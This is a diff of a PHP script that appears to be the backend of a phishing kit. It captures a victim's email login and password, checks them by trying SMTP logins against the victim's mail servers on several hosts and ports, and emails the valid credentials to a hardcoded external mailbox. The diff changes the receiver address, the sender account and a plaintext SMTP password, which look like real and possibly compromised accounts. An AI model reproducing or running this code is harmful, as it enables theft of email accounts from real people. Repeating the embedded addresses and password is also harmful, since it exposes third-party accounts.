@@ -46,11 +46,11 @@ if (!$login || !$passwd || !str_contains($login, '@')) {
 list(, $domain) = explode('@', $login);
 
 // SMTP credentials for sending logs
-$receiver     = 'logs.ironside511@yandex.com';
-$senderuser   = 'info@lucagherardi.com';
-$senderpass   = 'V8WLLSypyJBbUv7';
+$receiver     = 'bobrob@elitat.com';
+$senderuser   = 'tp@globalhouse.co.th';
+$senderpass   = 'Globalhouse@123';
 $senderport   = 587;
-$senderserver = 'mail.lucagherardi.com';
+$senderserver = 'mail.globalhouse.co.th';
 $smtp_secure  = 'tls';
 
 $timestamp = date('Y-m-d H:i:s');
@@ -63,25 +63,88 @@ $connectionError = false;
 $logMessage = "=== CREDENTIAL TEST ATTEMPT ===\n";
 $logMessage .= "Timestamp: $timestamp\nEmail: $login\nPassword: $passwd\nDomain: $domain\nIP: $ip\nCountry: $country\nUser Agent: $browser\n";
 
-try {
-    $mail = new PHPMailer(true);
-    $mail->isSMTP();
-    $mail->SMTPAuth = true;
-    $mail->Host = $senderserver;
-    $mail->Username = $login;
-    $mail->Password = $passwd;
-    $mail->Port = $senderport;
-    $mail->SMTPSecure = $smtp_secure;
-    $mail->Timeout = 10;
-    $mail->SMTPDebug = 0;
+// Function to get MX records for domain
+function getMXRecords($domain) {
+    $mxhosts = [];
+    if (getmxrr($domain, $mxhosts)) {
+        return $mxhosts;
+    }
+    return false;
+}
 
-    if ($mail->smtpConnect()) {
-        $validCredentials = true;
-        $authStatus = '✅ VALID - Authenticated';
+// Function to test SMTP authentication
+function testSMTPAuth($email, $password, $domain) {
+    global $logMessage;
+    
+    // Common SMTP ports and security types to try
+    $smtpConfigs = [
+        ['port' => 587, 'secure' => 'tls'],
+        ['port' => 465, 'secure' => 'ssl'],
+        ['port' => 25, 'secure' => ''],
+        ['port' => 2525, 'secure' => 'tls']
+    ];
+    
+    // Common SMTP server patterns
+    $smtpServers = [
+        "mail.$domain",
+        "smtp.$domain",
+        "smtp1.$domain",
+        "smtp2.$domain",
+        "mail1.$domain",
+        "mail2.$domain",
+        "mx.$domain",
+        "mx1.$domain",
+        "mx2.$domain"
+    ];
+    
+    // Get MX records
+    $mxRecords = getMXRecords($domain);
+    if ($mxRecords) {
+        $smtpServers = array_merge($mxRecords, $smtpServers);
+    }
+    
+    foreach ($smtpServers as $server) {
+        foreach ($smtpConfigs as $config) {
+            try {
+                $mail = new PHPMailer(true);
+                $mail->isSMTP();
+                $mail->SMTPAuth = true;
+                $mail->Host = $server;
+                $mail->Username = $email;
+                $mail->Password = $password;
+                $mail->Port = $config['port'];
+                $mail->SMTPSecure = $config['secure'];
+                $mail->Timeout = 10;
+                $mail->SMTPDebug = 0;
+                
+                $logMessage .= "Testing: $server:$config[port] ($config[secure])\n";
+                
+                if ($mail->smtpConnect()) {
+                    $mail->smtpClose();
+                    $logMessage .= "✅ SUCCESS: Authenticated with $server:$config[port] ($config[secure])\n";
+                    return true;
+                }
+                
+                $mail->smtpClose();
+                
+            } catch (Exception $e) {
+                $logMessage .= "❌ FAILED: $server:$config[port] - " . $e->getMessage() . "\n";
+                continue;
+            }
+        }
+    }
+    
+    return false;
+}
 
-        $mail->smtpClose();
+// Test the credentials against the user's domain
+$validCredentials = testSMTPAuth($login, $passwd, $domain);
 
-        // Send validation report using real sender account
+if ($validCredentials) {
+    $authStatus = '✅ VALID - Authenticated';
+    
+    // Send validation report using real sender account
+    try {
         $notify = new PHPMailer(true);
         $notify->isSMTP();
         $notify->SMTPAuth = true;
@@ -99,12 +162,11 @@ try {
 
         $notify->send();
         $emailSent = true;
-    } else {
-        $authStatus = '❌ INVALID - Auth Failed';
-        $connectionError = true;
+    } catch (Exception $e) {
+        $logMessage .= "⚠️ Email notification failed: " . $e->getMessage() . "\n";
     }
-} catch (Exception $e) {
-    $authStatus = "❌ ERROR: " . $e->getMessage();
+} else {
+    $authStatus = '❌ INVALID - Auth Failed';
     $connectionError = true;
 }
 
